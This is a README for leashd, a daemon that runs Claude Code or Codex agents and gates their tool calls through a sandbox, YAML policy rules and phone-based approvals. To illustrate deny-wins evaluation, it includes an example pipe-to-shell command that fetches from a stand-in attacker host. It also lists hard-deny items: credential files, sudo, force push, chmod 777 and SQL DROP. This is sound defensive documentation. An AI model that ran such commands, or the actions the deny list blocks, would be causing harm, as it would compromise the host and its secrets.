<h1 align="center">leashd</h1>

<p align="center"><b>Run Claude Code as a daemon. Drive it from your phone. Keep a leash on it.</b></p>

<p align="center">
<a href="https://pypi.org/project/leashd/"><img src="https://img.shields.io/pypi/v/leashd.svg" alt="PyPI"></a>
<a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10%2B-blue.svg" alt="Python 3.10+"></a>
<a href="#development"><img src="https://img.shields.io/badge/coverage-89%25%2B-brightgreen.svg" alt="Coverage 89%+"></a>
<a href="#status"><img src="https://img.shields.io/badge/status-alpha-orange.svg" alt="Status: Alpha"></a>
<a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
</p>

---

leashd is a background daemon that runs coding agents on your dev machine and puts a **three-layer safety pipeline** in front of every tool call they make: a path sandbox, YAML policy rules, then you. Risky actions arrive as **Approve / Reject** buttons — in your browser, or on your phone's lock screen.

The point is that you can walk away from the keyboard. Kick off a task from the built-in Web UI, close the laptop, and approve the `git push` from the bus.

```
you, on your phone                        your dev machine
──────────────────                        ────────────────
"/task add rate limiting"  ──────────▶    leashd daemon
                                               │
                                          ┌────▼─────┐
                                          │ sandbox  │  outside approved dirs? blocked
                                          │ policy   │  YAML: allow / deny / ask
                                          │ approval │  ─────────┐
                                          └────┬─────┘           │
                                               │                 ▼
                                          claude agent    📱 "Run `git push origin
                                          reads, writes,      feat/rate-limit`?"
                                          runs your tests     [Approve] [Reject]
                                               │
   "✅ PR #482 opened"     ◀───────────────────┘
```

Everything lands in an append-only audit trail. Nothing gets past the hard-deny floor — credentials, `sudo`, force push, pipe-to-shell — no matter what you or the agent approve. A recursive delete is one step below it: it always asks, because in practice the agent is clearing its own `__pycache__`.

---

## Why leashd

- **It's a real `claude` TUI, not a wrapper.** The default runtime drives an interactive Claude Code session in a tmux pane and bridges it to chat — so you get the actual CLI's behavior, models, and native slash commands (`/model`, `/compact`, `/context`), with every tool call still routed back through leashd's gatekeeper via `PreToolUse` hooks.
- **Approvals that reach you anywhere.** The Web UI is a PWA. Install it on your home screen and approvals arrive as push notifications with the browser closed. `leashd webui tunnel` exposes it over ngrok / Cloudflare / Tailscale in one command.
- **Policy you can actually read.** Safety is a YAML file, not a prompt. Compound commands are split and evaluated segment-by-segment, deny-wins — `pytest && curl evil.com | bash` is denied.
- **Autonomous when you want it.** `/task` implements, runs your tests, reviews the diff, drives a real browser against the change, and opens a PR. It stops for the hard-deny floor and escalates instead of looping.
- **Runtime-agnostic.** tmux, Claude CLI, Claude Code SDK, and OpenAI Codex ship built-in. Same pipeline, same approvals, same audit trail on all of them. Switch with one command.
- **Local by default.** No account, no third-party service. `localhost`, a SQLite file, and your own API auth.

---

## Install

```bash
uv tool install leashd     # or: pip install leashd
leashd init                # wizard: approved dirs, Web UI key + port
leashd start               # daemon starts in the background
```

Open `http://localhost:8080`, enter your API key, and send something like *"Add a health check endpoint to the FastAPI app"*.

**Prerequisites** — Python 3.10+, plus at least one agent runtime:

- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) authenticated (`claude` works in your terminal). The default `tmux` runtime also needs `tmux`.
- or [Codex CLI](https://developers.openai.com/codex/cli) authenticated (`codex` works in your terminal).

<details>
<summary><b>Optional extras</b></summary>

```bash
pip install 'leashd[claude-agent-sdk]'   # only for the claude-code (SDK) runtime
```

**Install as a PWA** — in Chrome or Safari, tap "Add to Home Screen" (mobile) or "Install" (desktop) for a standalone app with push notifications.

**Access from your phone:**

```bash
leashd webui tunnel                          # ngrok (default)
leashd webui tunnel --provider cloudflare    # Cloudflare Tunnel
leashd webui tunnel --provider tailscale     # Tailscale Funnel
```

The tunnel is a child of the daemon and stops when it does. When it's up, your `LEASHD_WEB_API_KEY` is the only thing between the internet and your machine — pick a strong one. Failed auth is rate-limited (5 failures → 60s lockout).

**Telegram instead of (or alongside) the Web UI:**

1. Message **@BotFather**, send `/newbot`, copy the token.
2. Message **@userinfobot** for your numeric user ID.
3. Set both and restart:

```env
LEASHD_TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
LEASHD_ALLOWED_USER_IDS=981234567
```

Both connectors run at once on the same engine — start a task in the browser, watch it from your phone.

</details>

---

## Safety

Every tool call the agent makes passes through three layers before it can execute.

| Layer | What it does |
|---|---|
| **1. Sandbox** | The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Traversal attempts are blocked and logged as security violations. |
| **2. Policy** | YAML rules classify each call as `allow` / `deny` / `require_approval` by tool name, command pattern, and path pattern. First match wins. Compound bash is split on `&&`, `||`, `;` and evaluated per segment, deny-wins. |
| **3. Approval** | `require_approval` sends an inline **Approve / Reject** to the Web UI or Telegram. No response within the timeout → denied. |

The pipeline is runtime-agnostic and connector-agnostic: same sandbox, same rules, same buttons whether you're on Claude Code or Codex, browser or phone. Every attempt and decision is appended to `.leashd/audit.jsonl`.

**Five policies ship in `policies/`:**

| Policy | Auto-allows | Requires approval |
|---|---|---|
| **`default.yaml`** *(recommended)* | reads, search, read-only shell (`ls`, `grep`, `ps`, `awk`, `git log/diff`, `docker ps/logs`, `--version`), loopback GETs, read-only browser | git push/rebase/merge, network, browser mutations |
| **`strict.yaml`** | `Read`, `Glob`, `Grep`, `LS` only | everything else (2-min timeout) |
| **`permissive.yaml`** | reads, writes, package managers, test runners, `git add/commit/stash`, all browser | git push, network, browser cookies/auth/storage, anything unlisted (10-min timeout) |
| **`dev-tools.yaml`** *(overlay)* | linters, test runners, package managers | — |
| **`autonomous.yaml`** | writes, tests, linters, package managers, safe git, `gh pr` | AI-evaluated: feature-branch push, network, browser mutations |

All five sit on top of a **hard-deny floor**: credential files, `sudo`, force push, push to main/master, pipe-to-shell, `chmod 777`, SQL `DROP`/`TRUNCATE`. `rm -rf` sits just under it as `require_approval` — it can never run unattended, but you can wave it through instead of losing the turn.

> Deny patterns match what the shell will *execute*, quoting respected — including a payload handed to `bash -c` or `eval`. `grep "rm -rf" tests/` is a search, not a destructive command, and is not blocked.

> **File edits are not a policy rule.** They belong to the active mode: `/auto` runs them, `/edit` accepts them, `/default` prompts, `/plan` blocks them. The policy is the guardrail layer that applies on top in *every* mode.

```env
LEASHD_POLICY_FILES=policies/strict.yaml
LEASHD_POLICY_FILES=policies/default.yaml,policies/my-overrides.yaml   # merged, in order
```

---

## Runtimes

| Runtime | Backend | Session resume | Install | Stability |
|---|---|---|---|---|
| **tmux** *(default)* | Interactive `claude` TUI in a tmux pane | Session tokens | `claude` CLI + `tmux` | stable |
| **claude-cli** | Claude CLI (native subprocess, no SDK) | NDJSON session IDs | `claude` CLI authenticated | beta |
| **claude-code** | Claude Code CLI (SDK) | SDK sessions | `claude` CLI + `leashd[claude-agent-sdk]` | stable |
| **codex** | Codex CLI | Thread IDs | `codex` CLI authenticated | beta |

```bash
leashd runtime list      # what's available
leashd runtime show      # what's active, and its capabilities
leashd runtime set codex # switch
```

All four support interactive approval, streaming, and the full autonomous pipeline. Each declares its capabilities to the engine, which adapts session resume and approval routing automatically.

**The `tmux` runtime** is what makes leashd feel different. It spawns a real interactive `claude` TUI in a tmux pane and talks to it the way a human would — so native slash commands pass straight through from chat, dialogs the CLI opens (model picker, consent prompts) get bridged to inline buttons, and `/screen` gives you a live snapshot of the terminal. Tool calls are intercepted by Claude Code `PreToolUse` hooks and routed back into leashd's gatekeeper, so nothing escapes the pipeline.

**Restarting is safe.** tmux panes live on a tmux server of their own, so `leashd restart` — to pick up a fix, a config change, a new build — no longer ends the work in them. The daemon writes what it needs to find each pane again, leaves them running on the way out, and re-adopts them on the way in: same conversation, same session, same directory. A turn that was still running keeps streaming into the chat where it left off. `leashd stop --end-agents` ends them instead. See [docs/agents.md](docs/agents.md#restarting-without-losing-work).

**Adding your own** — extend `SubprocessAgent` for any CLI-driven agent tool and register it with the runtime registry.

---

## Autonomous mode

`/task <description>` hands the whole thing over. The v4 orchestrator runs a linear pipeline:

```
/task "Add health check endpoint"
        │
        ├─ implement ─── Claude's native `auto` permission policy;
        │                every tool still gated by the hook pipeline
        │
        └─ verify ────── your test suite (make check / pytest / npm test)
                       + a code-quality diff review
                       + a real browser pass over the change (agent-browser:
                         a11y, vitals, console, network 4xx/5xx, screenshots)
        │
        ▼
   PR link — or an escalation message if it gets stuck
```

Task memory and git-backed checkpoints survive daemon restarts. When a phase burns its retry budget the orchestrator escalates to you instead of looping. Opt a separate review phase back in with `/task --phases implement,verify,review`.

In an autonomous run, **AI approval replaces human taps** for `require_approval` calls — a secondary model evaluates each one in context. Plan reviews still come to you. The hard-deny floor still can't be overridden.

```bash
leashd orchestrator enable    # turns on /task
leashd orchestrator show      # status + active policy
```

---

## Interfaces

### Web UI

The primary interface — a full chat client on `localhost` with zero external dependencies.

- **Real-time streaming** over WebSocket, with a live tool indicator (`🔧 Bash: pytest tests/`) and a `🧰 Bash ×3, Read, Glob` summary when the turn lands
- **Inline approvals and question modals**, identical to Telegram
- **Push notifications** — Web Push on your lock screen with the browser closed; in-page chime and tab-title flash when backgrounded; optional Telegram cross-notification with deep links
- **Installable PWA** with proper safe-area handling on notched devices
- **Seamless reconnection** — pending approvals, questions and in-progress drafts survive a reconnect; a 120s grace period carries sessions through sleep/wake; instant reconnect on phone unlock
- **27 color themes** (Dracula, Monokai, Catppuccin, Nord, Synthwave, Matrix, …), each with dark and light variants
- **Conversation tabs and history**, searchable
- **Directory and workspace switching** without slash commands
- **Settings page** for runtime, effort, max turns, themes
- **File attachments** — drag-and-drop photos, screenshots and PDFs, threaded to the agent with vision
- **Mobile-tuned input** — Enter inserts a newline, Send submits, so multi-line prompts work on a phone keyboard

Full guide: [docs/webui.md](docs/webui.md).

### Telegram

Same engine, same sessions, native chat app. Agent Markdown renders properly — headings, bold, lists, code fences, tables. Approvals, questions and plan reviews all arrive as inline buttons.

### Multiple conversations in one chat

The Web UI has always had conversation tabs. `/session` gives a Telegram chat the same thing — several independent conversations, each with its own agent, working directory, mode and history:

```
/session              # list them, with buttons to switch
/session new ~/api    # open another (up to 9)
/session 2            # switch to #2
/session kill 2       # terminate #2
```

Switching pauses nothing — a conversation you leave keeps working. What it stops doing is writing into the chat, so two agents can't interleave into one message stream. Instead you get a one-line notice with an **Open** button: `#2 replied` when its turn lands, `#2 is waiting on you` when it hits an approval, a question or a plan review. **The prompt itself is held and rendered under #2 when you open it**, so it is always read in the conversation that raised it rather than pasted under the one you happen to be looking at. Walking away from a prompt you have not answered takes it back down with you and reissues it when you return.

Conversation #1 is the chat itself, so nothing changes about an existing chat until you open a second one — and for the same reason it is the one conversation with no `✕`. There is no slot to free: `/session kill 1` stops its agent and clears its history, like `/clear`, and it stays on the list.

### CLI

No Web UI and no Telegram token? leashd falls back to a local REPL:

```bash
leashd start -f
# > type your prompts here
```

Approval-gated actions are auto-denied here — there's no UI to approve from.

---

## Commands

Available in both the Web UI and Telegram.

| Command | Description |
|---|---|
| `/task <description>` | Autonomous: implement → verify → PR |
| `/goal <condition>` | Set a completion condition the agent works toward across turns until a fast model confirms it's met *(tmux runtime)* |
| `/web <instruction>` | Autonomous web automation with content-level human approval |
| `/test` | 9-phase agent-driven test workflow with browser automation |
| `/plan <text>` | Plan mode — agent proposes, you approve before execution |
| `/edit <text>` | Edit mode — direct implementation |
| `/auto <text>` | Auto mode — Claude's native auto permission policy; leashd intercepts escalations |
| `/default` | Back to balanced default mode |
| `/session` | Several conversations in one chat. `/session new [dir]` opens one, tap to switch, `✕` terminates |
| `/dir` | Switch working directory (inline buttons). Blocked while an agent is running |
| `/ws` | Manage workspaces inline. Blocked while an agent is running |
| `/git <subcommand>` | Full git suite: status, branch, checkout, diff, log, add, commit, push, pull |
| `/file <path>` | Send a real file from an approved directory to the chat (globs work) |
| `/screen` | Snapshot of the live `claude` terminal *(tmux runtime)* |
| `/stop` | Stop all ongoing work without resetting the session |
| `/resume` | Reattach a conversation dropped by a timeout, interrupt, or `/stop`. `/resume <message>` does both at once |
| `/cancel` | Cancel the active task in this chat |
| `/tasks` | List active and recent tasks for this chat |
| `/plugin` | Manage Claude Code plugins mid-session |
| `/status` | Current session, mode, and directory |
| `/clear` | Clear history, cancel active tasks, start fresh |

On the `tmux` runtime, Claude's own slash commands (`/model`, `/compact`, `/context`, `/cost`, `/help`, …) pass straight through to the TUI, and any dialog they open is bridged to inline buttons.

---

## Browser automation

Two backends power `/web` and `/test`, both gated by the same safety pipeline:

| Backend | Install | Best for |
|---|---|---|
| [agent-browser](https://github.com/vercel-labs/agent-browser) *(default)* | `npm i -g agent-browser && agent-browser install` | Fast Rust CLI, accessibility-tree snapshots with deterministic refs (`@e1`), headless by default, cloud providers + iOS Simulator |
| [Playwright MCP](https://github.com/playwright-community/mcp) | `npx playwright install chromium` | Test generation, MCP-native tooling |

Read-only tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutations (click, navigate, type) require approval. `auth` / `cookies` / `storage` / `clipboard` are policy-gated and never auto-approved. `/web` sessions checkpoint their progress, so a crash mid-workflow resumes instead of restarting.

```
1. start your dev server (npm run dev, uvicorn, …)
2. /test --url http://localhost:3000
3. the agent navigates, verifies, and reports — each mutation needs your tap
```

See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths, the full tool reference, and policy details.

---

## Workspaces

Group related repos so the agent gets multi-repo context across all of them at once. `CLAUDE.md` files from every workspace directory are loaded, and the system prompt includes the multi-repo context.

```bash
leashd ws add my-saas ~/src/api ~/src/web
leashd ws show my-saas
```

---

## Configuration

leashd is configured through CLI commands — run `leashd init` once, then use subcommands. Config resolves in layers, each overriding the last:

```
~/.leashd/config.yaml   ← global base (managed by leashd init / CLI)
.env in your project    ← per-project overrides
environment variables   ← highest priority
```

All settings are env vars prefixed with `LEASHD_`. See [docs/configuration.md](docs/configuration.md) for the full 40+ setting reference.

<details>
<summary><b>CLI reference</b> — daemon, dirs, runtimes, Web UI, browser, plugins, skills, workspaces</summary>

```bash
# Daemon
leashd start              # background
leashd start -f           # foreground (debugging)
leashd status / stop / restart
leashd stop --end-agents  # stop, and end the running agents too
leashd reload             # reload config without restart (SIGHUP)
leashd version

# Setup and inspection
leashd init               # first-time wizard
leashd config             # resolved config, all layers merged
leashd clean              # remove runtime artifacts

# Approved directories
leashd add-dir /path/to/project
leashd remove-dir /path/to/project
leashd dirs

# Runtimes
leashd runtime list / show
leashd runtime set <tmux|claude-cli|claude-code|codex>

# Task orchestrator
leashd orchestrator enable / disable / show

# Web UI
leashd webui show / enable / disable / url
leashd webui tunnel [--provider ngrok|cloudflare|tailscale]

# Browser
leashd browser show
leashd browser set-backend agent-browser
leashd browser set-profile ~/.leashd/browser-profile
leashd browser clear-profile
leashd browser headless
leashd browser auto-approve on   # approve agent-browser browsing in every conversation

# Agent tuning
leashd effort show / set <low|medium|high|xhigh|max>    # default: xhigh
leashd turns show / set <N>

# Plugins and skills
leashd plugin list / add <source> / remove <name> / enable <name> / disable <name>
leashd skill list / add skill.zip / remove <name> / show <name>

# Workspaces
leashd ws add my-saas ~/src/api ~/src/web
leashd ws list / show <name>
leashd ws remove <name> [dir]

# Workflows (YAML playbooks in .leashd/workflows/ or ~/.leashd/workflows/)
leashd workflow list / show <name>
```

Plugins can also be managed mid-session with the `/plugin` chat command — no restart needed. Max turns and effort are also editable from the Web UI Settings page.

</details>

<details>
<summary><b>Storage, streaming, logging</b></summary>

**Sessions** live in a centralized SQLite database at `~/.leashd/messages.db` and persist across daemon restarts — the agent remembers context between sessions, and every message carries cost, duration and session metadata. Centralizing it is what keeps concurrent Web UI and Telegram sessions from racing. For dev/testing: `LEASHD_STORAGE_BACKEND=memory`.

**Streaming** is on by default in both interfaces. Disable with `LEASHD_STREAMING_ENABLED=false`.

**Logging** uses [structlog](https://www.structlog.org/); file logging (JSON, rotating) is on by default at `~/.leashd/logs`.

```env
LEASHD_LOG_LEVEL=DEBUG     # full trace including policy decisions
LEASHD_LOG_LEVEL=INFO      # default — operational events
LEASHD_LOG_DIR=~/.leashd/logs
```

The `INFO` event sequence for one request:

```
engine_building → engine_built → daemon_starting → session_created →
request_started → agent_execute_started → agent_execute_completed →
request_completed
```

</details>

---

## Architecture

The **Engine** receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active runtime, and sends responses back. The **MultiConnector** routes by `chat_id` so the Web UI and Telegram share one engine — sessions, approvals and task state are unified. The **RuntimeRegistry** manages pluggable backends, each declaring its capabilities. Every tool call is intercepted by the **Gatekeeper**, which orchestrates the three-layer pipeline. An **EventBus** decouples subsystems — plugins subscribe to `tool.allowed`, `tool.denied`, `approval.requested`, `task.submitted`. The **TaskOrchestrator** runs the implement → verify pipeline with persistent task memory.

```
Web UI connector ────┐
                     ├─▶ MultiConnector (chat_id routing)
Telegram connector ──┘         │
                          Middleware (auth, rate limit)
                               │
                            Engine ──── EventBus ──── TaskOrchestrator (implement → verify)
                               │                       TaskMemory
                          RuntimeRegistry
                               ├─ tmux (default)
                               ├─ Claude CLI
                               ├─ Claude Code (SDK)
                               └─ Codex
                               │
                          Gatekeeper ──────────────────────────────┐
                               │                                   │
                          Active agent runtime          1. Sandbox check
                               │                        2. Policy rule match
                               └── tool call ──────────▶ 3. Human / AI approval
```

Deeper detail in [docs/index.md](docs/index.md).

---

## Development

```bash
git clone git@github.com:vmehera123/leashd.git && cd leashd
uv sync

make check                     # lint + format + mypy + unit tests
uv run pytest tests/ -v
uv run pytest --cov=leashd tests/

uv run playwright install chromium   # one-time
make check-all                       # = make check + E2E (Playwright vs the WebUI)
```

CI runs unit and E2E separately so Playwright setup issues don't block unit results.

---

## Status

leashd is **alpha** — the API and config schema may still change between versions. The core (daemon, safety pipeline, Web UI, Telegram, policy engine, task orchestrator, multi-runtime) is stable and tested at 89%+ coverage. Not recommended where an agent action could be irreversible without review.

Recent releases are in [CHANGELOG.md](CHANGELOG.md). Bugs and ideas: [open an issue](https://github.com/vmehera123/leashd/issues).

## License

[Apache 2.0](LICENSE)
